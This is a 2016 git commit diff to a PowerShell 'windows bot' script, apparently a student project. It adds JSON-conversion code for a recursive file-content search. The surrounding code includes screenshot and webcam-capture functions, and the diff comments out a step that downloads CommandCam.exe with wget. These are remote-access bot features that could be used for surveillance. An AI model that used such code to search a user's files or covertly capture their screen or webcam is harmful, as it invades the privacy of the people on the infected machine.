55807014fa5204aeedc54ca882c8421a91b90569
sean <sjm4584@rit.edu>
2016-04-15 18:28:40 -0400

    OMG I DID IT. I AM THE JSON

--- bot_code/windows/win_bot.ps1
+++ bot_code/windows/win_bot.ps1
@@ -1,13 +1,46 @@
 # windows bot 
 
+function create_json($json_object, $input_object) {
+	#$input_json = $input_object
+	$json_object += $input_object | convertto-json #convertto-json -inputobject $input_object
+	
+	return $json_object #| convertto-json
+}
+
 # Name: 		find_string
 # Parameters: 	$string (value to search)
 # Return value:	returns an object containing the list of files
 # Purpose: 		find all files containing a given string
 function find_string ($string){
-	$files = Get-ChildItem -recurse | select-string -pattern $string | group path | select name
+	$string_a ="this is a super hard test"
+	$file1 = Get-ChildItem -recurse | select-string -pattern $string_a | convertto-json
+	$string_b = "another etest yo"
+	$file2 = get-ChildItem -recurse | select-string -pattern $string_b | convertto-json
+	
+	#write-host "[+] file 1:"
+	#write-host $file1
+	#write-host "[+] file 2:"
+	#write-host $file2
+	#$obj = create_json $obj, $file1 #| convertto-json
+	#$obj_ = create_json $obj, $file2 #| convertto-json
+	#$dog = convertto-json $obj
+	#write-host ""
+	#$json_object = convertto-json -inputobject $file1
+	#$json_object += convertto-json -inputobject $file2
+	$magic = ""
+	$obj_ = create_json $magic, $file1
+	$obj_ = create_json $obj_, $file2
+	write-host "[+] json object: "
+	write-host $obj_ #|convertto-json #$dog #$obj #|convertto-json
+		
+	#$obj_a = convertfrom-json -inputobject $files 
+	#$obj_a | add-member $file2
+	#write-host "maaaagic---------------"
+	#write-host $obj_a | convertto-json
+	
 	return $files
 }
+find_string "magic"
 
 # Name:			take_screenshot
 # Parameters:	None
@@ -39,9 +72,9 @@ function take_screenshot {
 function webcam_capture {
 	# If we don't have the application required to screenshot, go get it. Then run it.
 	# If we already have it then this test will pass and will just run it.
-	if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
-		wget http://localhost/CommandCam.exe
-	}
+	#if (-not Test-Path 'C:\Program Files\CommandCam.exe'){
+#		wget http://localhost/CommandCam.exe
+	#}
 	
 	$date = Get-Date -format yyyy-mm-dd_H_M_s
 	
@@ -49,3 +82,5 @@ function webcam_capture {
 	
 	return ".pics$date.bmp"
 }
+
+
